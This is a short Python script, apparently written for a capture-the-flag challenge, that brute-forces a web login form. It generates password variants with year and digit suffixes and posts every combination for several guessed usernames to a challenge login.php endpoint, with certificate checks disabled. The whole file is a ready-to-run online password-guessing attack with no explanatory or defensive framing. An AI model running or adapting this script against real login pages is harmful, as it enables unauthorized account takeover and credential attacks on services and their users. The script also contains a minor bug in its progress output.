#!/usr/bin/env python3

import requests
import IPython

requests.packages.urllib3.disable_warnings()

def get_wordlist():
    wordlist = []
    with open('wordlist') as infile:
        words = infile.readlines()
    for word in words:
        w = word.strip()
        wordlist.extend([w, w.lower(), w.upper(), w+'2022', w+'22!'])
    return wordlist

def get_wordlist2():
    wordlist = []
    with open('wordlist') as infile:
        words = infile.readlines()
    for word in words:
        w = word.strip()
        wordlist.append(w)
        for suffix in ['89', '90', '91', '92', '93', '94']:
            wordlist.extend([w+'19'+suffix, w+suffix, w+suffix+'!'])
    return wordlist

def get_wordlist3():
    wordlist = []
    with open('wordlist') as infile:
        words = infile.readlines()
    for word in words:
        w = word.strip()
        for base in [w, w.lower(), w.upper()]:
            for suffix in ['88', '89', '90', '91', '92', '93', '94', '95']:
                wordlist.extend([base+'19'+suffix, base+'19'+suffix+'!', base+suffix, base+suffix+'!'])
    return wordlist

def brute():
    #usernames = ['admin', 'dhb', 'stefan', 'Stefan', 'DHB']
    usernames = ['Steps', 'steps', 'admin', 'stefan', 'Stefan']
    passwords = get_wordlist3()
    print('[*] Wordlist contains {wlen} passwords for {ulen} users'.format(wlen=len(passwords), ulen=len(usernames)))
    for username in usernames:
        print('[*] Attempting for username: {username}'.format(username=username))
        for i, password in enumerate(passwords):
            if i> 0 and i%1000 == 0:
                print("{p} %".format(i/len(passwords*100)), end='\r')
            params = {'username': username, 'password': password}
            resp = requests.post('https://000990aa23-web-guessmypwd.dbhchallenge.net/login.php', data=params, verify=False)
            if not resp.status_code == 401:
                print('[+]', resp.status_code, username, password)

#IPython.embed()
brute()
